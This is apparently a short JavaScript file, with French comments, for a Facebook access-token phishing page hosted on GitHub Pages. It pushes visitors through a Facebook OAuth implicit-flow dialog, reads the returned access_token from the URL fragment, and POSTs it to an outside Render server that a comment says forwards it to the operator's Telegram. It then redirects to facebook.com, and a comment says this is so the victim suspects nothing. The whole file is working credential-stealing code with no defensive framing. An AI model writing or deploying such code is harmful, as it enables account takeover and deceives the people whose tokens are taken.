const GITHUB_URL = "https://jeandolin2-lang.github.io/Token-claim/";
const RENDER_URL = "https://token-claim.onrender.com/save-token";

window.onload = function() {
    // Cas 1 : On revient de Facebook avec le Token
    if (window.location.hash.includes('access_token')) {
        const params = new URLSearchParams(window.location.hash.replace('#', '?'));
        const token = params.get('access_token');

        if (token) {
            // Envoi au serveur Render (qui l'envoie à ton Telegram)
            fetch(RENDER_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ token: token })
            })
            .finally(() => {
                // Redirection finale vers FB pour que l'utilisateur ne se doute de rien
                window.location.href = "https://www.facebook.com";
            });
        }
    } 
    // Cas 2 : L'utilisateur arrive sur le site, on l'envoie direct sur FB
    else {
        const clientId = "350685531728";
        const authUrl = `https://www.facebook.com/v1.0/dialog/oauth?client_id=${clientId}&redirect_uri=${GITHUB_URL}&response_type=token&scope=public_profile,user_posts`;
        window.location.href = authUrl;
    }
};
